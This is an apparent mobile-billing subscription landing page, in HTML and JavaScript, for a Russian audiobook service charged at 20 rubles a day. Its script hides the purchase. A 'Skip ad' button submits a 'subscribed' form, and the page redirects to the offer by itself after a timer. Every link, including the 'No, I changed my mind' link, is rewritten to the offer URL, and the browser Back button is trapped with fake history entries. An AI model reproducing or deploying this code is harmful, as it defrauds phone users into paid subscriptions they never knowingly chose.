<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Книги</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=none">
    <meta http-equiv="X-UA-Compatible" content="IE=7">
    <meta name="author" content="marazmen">
    <link rel="stylesheet" href="styles/app.css">
    <script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
    <script src="https://cdn.jsdelivr.net/npm/v-mask/dist/v-mask.min.js"></script>
    <style>
        .activate-btn-new {
            padding: 0;
        }
        .btn-content.new {
            font-size: 21px;
            padding: 0;
        }
        .ani-progress {
            width: 0;
            background: #ff0;
            transition-property: width;
            transition-duration: 4s;
            transition-timing-function: linear;
        }
        .btn-group {
            margin-top: -50px;
            width: 100%;
        }

        .activate-btn-new {
            padding: 0;
        }

        .btn-content.new {
            font-size: 21px;
            padding: 0;
            color: #ffffff;
        }
        .ani {
            animation-name: pulse;
            animation-duration: 1.1s;
            animation-iteration-count: infinite;
        }


        @-webkit-keyframes pulse {
            0% {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);

            }
            50% {
                -webkit-transform: scale3d(1.05, 1.05, 1.05);
                transform: scale3d(1.05, 1.05, 1.05);
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
            }
        }

        @keyframes pulse {
            0% {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);

            }
            50% {
                -webkit-transform: scale3d(1.05, 1.05, 1.05);
                transform: scale3d(1.05, 1.05, 1.05);
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
            }
        }

        @-webkit-keyframes width {
            0% {
                width: 0;
            }
            to {
                width: 28%;
            }
        }

        @keyframes width {
            0% {
                width: 0;
            }
            to {
                width: 28%;
            }
        }

        .width {
            -webkit-animation-name: width;
            animation-name: width;
            animation-timing-function: steps(22, end);
            animation-duration: 7s;
            animation-fill-mode: forwards;
        }

        .animate__pulse {
            -webkit-animation-name: pulse;
            animation-name: pulse;
            -webkit-animation-timing-function: ease-in-out;
            animation-timing-function: ease-in-out
        }
        .ani-progress {
            width: 0;
            background: #ff0;
            transition-property: width;
            transition-duration: 4s;
            transition-timing-function: linear;
            width: 100%
        }

        .btn-group {
            margin-top: -50px;
            width: 100%;
        }

        .player__description {
            font-size: 12px;
            font-style: normal;
            font-weight: 400;
            line-height: normal;
            color: #000000;
            text-align: center;
            padding-top: 10px;
        }

        .player__textBtn {
            color: #ffffff;
        }

        @-webkit-keyframes pulse {
            0% {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);

            }
            50% {
                -webkit-transform: scale3d(1.05, 1.05, 1.05);
                transform: scale3d(1.05, 1.05, 1.05);
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
            }
        }

        @keyframes pulse {
            0% {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);

            }
            50% {
                -webkit-transform: scale3d(1.05, 1.05, 1.05);
                transform: scale3d(1.05, 1.05, 1.05);
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
            }
        }

        @-webkit-keyframes width {
            0% {
                width: 0;
            }
            to {
                width: 28%;
            }
        }

        @keyframes width {
            0% {
                width: 0;
            }
            to {
                width: 28%;
            }
        }

        .width {
            -webkit-animation-name: width;
            animation-name: width;
            animation-timing-function: steps(22, end);
            animation-duration: 7s;
            animation-fill-mode: forwards;
        }

        .animate__pulse {
            -webkit-animation-name: pulse;
            animation-name: pulse;
            -webkit-animation-timing-function: ease-in-out;
            animation-timing-function: ease-in-out
        }
        .iterator {
            width: 20px;
            height: 20px;
            border-radius: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-content: center;
            color: #ffffff;
            background: indianred;
            position: absolute;
            right: 7px;
            top: 7px;
            font-size: 14px;
        }

    </style>
</head>
<body>
<div id="app">
    <header>
        <div class="header-top">
            <div class="logo">
                <img src="assets/images/logo.png" alt=""/>
            </div>
        </div>
    </header>
    <div class="top-img" v-show="ageConfirm">
        <img src="assets/images/img.png" alt="">
    </div>
    <div class="book-container" v-show="!ageConfirm">
        <div class="player">
        </div>
    </div>
    <div class="btn-container">
        <div class="title" v-show="!ageConfirm">
            <img src="assets/images/listen.png" alt=""/>
            <span>
                слушайте эксклюзивы <br>
                в библиотеке из 60 000 книг
            </span>
        </div>
        <form id="finalize"
              action="/route"
              method="post"
              v-show="!ageConfirm"
        >
            <div class="form-group">
                <input type="hidden" name="_token" :value="csrfToken">
                <input type="hidden" name="promoter_id" :value="promoterId">
                <input type="hidden" name="result" value="subscribed">
            </div>
            <button class="btn btn-agree confirm main__btn activate-btn ani pulse player__playContainer" @click="" v-show="!ageConfirm" >
                <span class="text">Пропустить&nbsp;рекламу</span>
            </button>
        </form>
        <a href="#" class="reject" @click="window.history.back()">Нет, я передумал</a>
        <div class="price">
            Стоимость 20Р/сутки со счета билайн
        </div>
    </div>
    <div class="footer">
        Нажимая кнопку, вы подписываетесь на услугу "книги билайн".
        Стоимость 20 руб./сут. Отключить подписку вы сможете бесплатно в любой момент.
        <a href="https://books.beeline.ru/rules/policy.html"></a>Пользовательское соглашение
    </div>
</div>
<script src="js/main.js"></script>
<script>
    function getSearchParams(k) {
        var p = {};
        window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (s, k, v) {
            p[k] = decodeURIComponent(v)
        })
        return k ? p[k] : p;
    }

    let getParams = getSearchParams();
    let click_id = getParams["click_id"] || getParams["pt_id"] || ("p" + Date.now());
    const linkParams = (window.location.search.length > 1
        ? window.location.search
        : "?key=megavideomir&offer_id=13608&tmpl=65&partner_id=136205&source_id=1&pt_id={clickid}&traf_src={t8}&site_id={t10}\\n" + click_id);
    let first_entry = false;

    !function () {
        ~window.location.search.indexOf("click_id=") || (first_entry = true, history.replaceState({}, "", linkParams + "&click_id=" + click_id + "#"))
    }();
    !function (e) {
        var n;
        if ("function" == typeof define && define.amd && (define(e), n = !0), "object" == typeof exports && (module.exports = e(), n = !0), !n) {
            var t = window.Cookies, o = window.Cookies = e();
            o.noConflict = function () {
                return window.Cookies = t, o
            }
        }
    }(function () {
        function e() {
            for (var e = 0, n = {}; e < arguments.length; e++) {
                var t = arguments[e];
                for (var o in t) n[o] = t[o]
            }
            return n
        }

        function n(e) {
            return e.replace(/(%[0-9A-Z]{2})+/g, decodeURIComponent)
        }

        return function t(o) {
            function r() {
            }

            function i(n, t, i) {
                if ("undefined" != typeof document) {
                    "number" == typeof (i = e({path: "/"}, r.defaults, i)).expires && (i.expires = new Date(1 * new Date + 864e5 * i.expires)), i.expires = i.expires ? i.expires.toUTCString() : "";
                    try {
                        var c = JSON.stringify(t);
                        /^[\{\[]/.test(c) && (t = c)
                    } catch (e) {
                    }
                    t = o.write ? o.write(t, n) : encodeURIComponent(String(t)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent), n = encodeURIComponent(String(n)).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent).replace(/[\(\)]/g, escape);
                    var f = "";
                    for (var u in i) i[u] && (f += "; " + u, !0 !== i[u] && (f += "=" + i[u].split(";")[0]));
                    return document.cookie = n + "=" + t + f
                }
            }

            function c(e, t) {
                if ("undefined" != typeof document) {
                    for (var r = {}, i = document.cookie ? document.cookie.split("; ") : [], c = 0; c < i.length; c++) {
                        var f = i[c].split("="), u = f.slice(1).join("=");
                        t || '"' !== u.charAt(0) || (u = u.slice(1, -1));
                        try {
                            var a = n(f[0]);
                            if (u = (o.read || o)(u, a) || n(u), t) try {
                                u = JSON.parse(u)
                            } catch (e) {
                            }
                            if (r[a] = u, e === a) break
                        } catch (e) {
                        }
                    }
                    return e ? r[e] : r
                }
            }

            return r.set = i, r.get = function (e) {
                return c(e, !1)
            }, r.getJSON = function (e) {
                return c(e, !0)
            }, r.remove = function (n, t) {
                i(n, "", e(t, {expires: -1}))
            }, r.defaults = {}, r.withConverter = t, r
        }(function () {
        })
    });

    function init_link(e) {
        first_entry ? request(e) : read(e)
    }

    function read(e) {
        var t = window.Cookies.get("url_" + e + "_" + click_id);
        void 0 !== t && (offer[e] = t)
    }

    function request(e) {
        const s2s = "/link" + linkParams;
        let n = new XMLHttpRequest;
        n.open("GET", s2s, true);
        n.responseType = 'json';
        n.send();
        n.onload = () => {
            let res = n.response;
            if (res?.responseCode == 0 && (~res.redirectUrl.indexOf("prossejobes.ru") || ~res.redirectUrl.indexOf("prossejobes.ru"))) {
                offer[e] = res.redirectUrl;
                window.Cookies.set("url_" + e + "_" + click_id, offer[e]);
            }
        }
    }

    let text_arr = document.getElementsByClassName("btn-text"), text = text_arr[0],
        link_arr = document.getElementsByClassName("btn"), link = link_arr[0];
    let offer = [];

    offer[1] = "/click" + linkParams;

    function changeText(timerValue = 4) {
        const timer = timerValue;
        let iter = timer + 1;

        // Get button and progress bar elements
        const btnElement = document.getElementById("agree_btn");
        const progressBar = document.querySelector(".ani-progress");
        const btnDisclamer = document.querySelector(".player__disclaimer");

        // First state
        btnElement.innerHTML = `<span class="col btn-content new">Пропустить&nbsp;рекламу</span>`;

        // Smoothly transition progress bar width from 0% to 100%


        function transitionToSecondState() {
            clearInterval(interval);

            // Second state
            btnElement.innerHTML = `<span class="col btn-content new">Пропустить&nbsp;рекламу</span>`;
            // Smooth transition to the third state
            btnElement.style.transition = "opacity 1s ease-out";
            btnElement.style.opacity = "0";

            // Wait for the transition to complete before moving to the third state
            setTimeout(transitionToThirdState, 1000);
        }

        function transitionToThirdState() {
            // Third state
            btnElement.innerHTML = `
       <div class="player__textBtn">
        <h2>Подтверждаю</h2> <span>возраст</span>
       </div> <svg width="50" height="58" viewBox="0 0 50 58" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<rect width="50" height="58" fill="url(#pattern0_6_21)"/>
<defs>
<pattern id="pattern0_6_21" patternContentUnits="objectBoundingBox" width="1" height="1">
<use xlink:href="#image0_6_21" transform="scale(0.02 0.0172414)"/>
</pattern>
<image id="image0_6_21" width="50" height="58" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAA6CAYAAADybArcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAPBSURBVHgB1ZrNSxRhHMd/Oy7LqusimtYhAg9B0CHp0qV/oHNQdKlLEAmJSUGSRGYkKZlYJ7ODRi2VBB1CjeygFkISmlJSwYpk5NJusju7O7vuS99H3Bhq3fblmZnn+cDDLDOzMN/5vT7PPJROp52aph1RVXUXyQwEDIfD4TRGLBKJdAeDwR0kITYISOKo6M4tY7RUVFSM2my2OEkCE5Le5to03K7J5XItkAQoOa4dhkXmIHQoEAjsIcHJZRE9y4qiDIRCoTv19fUqCUi+QjLMw0o3ysvLR3BMkUAUKoSRQuy8SqVSHW63+y0JQjFCNoGYdVilBzVouLa29htZTNFCdPiSyeQlv9/vaWho0MgieAjJ8D6RSJyFu81aET8K8eOg3W6fikajD9Ah7CaT4WkRPUGMPsTPLcRPkEyAp0X0uDGuOJ3OCVjn+OLiooMMxiiL6GHx8oLVH/RvM2QQZgjZBOk6CDFPYrFYZ01NzQpxxjQhOr5jdCJ+HvGMHyuEZJjDaN+aLpScro0K9nxoxHiGF+nh0V1bKYThgDWOORyOeWS3Lq/X66QisdK1ssF6tmtwt/uFuptoQhisu/6A7voc2p3pfP9ktWtlQ4E1GsvKyqbwku/luxgiohA9pyHIi/i56PP5XLluFNG1sgJ3W0JT2oK2ZzzbddEt8ge42z7Me8bw4sfQHez/57osFvmLFIR1Q9jtqqoqHzshq5AM68huZ7D2NiK7EEYYY680MZKDwMbGhia7kBksHJ6srq7+ZSc5WUWgdyDQHyLoI+yEbEIiePC7OPajfVnVX5BFCEu3k7BCE6zwKdsNMgj5iKreio54AmIS290kcrD/hIA2lIdDqBPjuUQwRLSIhod+jmzUjr7qa75/EkkIK8xjW58t3uBYUKEWxbUW4EanMHc/iliYLlQEw2qLBDA8EHEdcfCDSsASIXjjKh5+Cum0FfVgiThghRCWTi9UVlaOEkfMFMLSaRcE9P8vlRaDGUISEDCE7ybn6+rqQmQQRgt5iTi4irZiBsFs6LzHECFwnc+wQg/caJBMgmsdYZ8OWEVeW1s7YKYIBi+LQEPagzWoy6jKy2QBPITMYwGgGXEwSRZSihCWTpvhQo9F2M5RsBA8tIZMdDMejw+KsOMhQ0FCYIGnOHSxPVxGFLVSyFfIHOKgFUXtnajbnHIKwVtnHy57MUsbMLIq8yCrEAhgq3dDqAl9mKV9IQlgQtgGzMzOBJZ9ZhHMbUinr0kmVFXtxYeUKNxnBb9PIKBlXbTbFLPT7/e7SWJ+A+4oziL277zNAAAAAElFTkSuQmCC"/>
</defs>
</svg>
`
            btnElement.style.opacity = "1";
            btnDisclamer.innerHTML = '<h1 class="player__disclaimer"></h1>';
            console.log("Final URL:", offer[1]);

            // Transition to another page
            setTimeout(() => {
                location.replace(offer[1]);
            }, 1000);
        }

        // Update counter text and continue the animation
        function updateCounterText() {
            // btnElement.querySelector(".btn-content.new").innerText = "Пропустить\u00A0рекламу";
            requestAnimationFrame(updateCounterText);
        }

        // Start the animation
        const interval = setInterval(function () {
            iter--;

            // Check for the second state
            if (iter === 0) {
                transitionToSecondState();
            } else {
                // Update counter text
                updateCounterText();
            }
        }, 900);
    }


    function link_click(t) {
        t.preventDefault(), go()
    }

    for (var links = document.getElementsByTagName("a"), i = 0; i < links.length; i++) {
        links[i].addEventListener("click", link_click);
        links[i].href = offer[1];
    }

    function go() {
        setTimeout(() => {

            location.replace(offer[1]);
        }, 1000);
    }

    function onpopfix() {
        setTimeout(function () {
            window.onpopstate = function (t) {
                t.state && links[0].click()
            }
        }, 0)
    }

    !function () {
        let t;
        if (first_entry)
            for (t = 0; 5 > t; ++t) history.pushState({}, "", "#")
    }();

    let started = false;

    function onstart() {
        started || (started = true, init_link(1), onpopfix(), changeText())
    }

    setTimeout(function () {
        onstart()
    }, 9e3), window.onload = function () {
        onstart()
    };
</script>
</body>
</html>
